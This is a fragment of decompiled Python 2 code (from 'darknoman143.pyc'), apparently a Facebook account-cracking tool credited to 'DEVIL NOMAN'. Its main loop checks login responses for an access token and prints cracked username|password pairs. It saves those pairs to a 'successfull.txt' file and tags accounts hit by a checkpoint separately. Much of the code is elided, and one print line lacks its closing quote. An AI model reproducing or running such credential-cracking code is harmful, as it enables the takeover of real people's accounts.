...
def menu():
    ...
    print '\x1b[1;96mAUTHOR  : DEVIL NOMSN '
    print '\x1b[1;96mYOUTUBE: DEVIL NOMAN '
    print '\x1b[1;96mGITHUB  : github.com/devilnoman
    print ''
    print 50* '-'
    print '\x1b[1;92m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[NOMAN_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[NOMAN_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [After 7 Days]\x1b[0m \n'
...
if __name__ == '__main__':
    menu()
# okay decompiling darknoman143.pyc
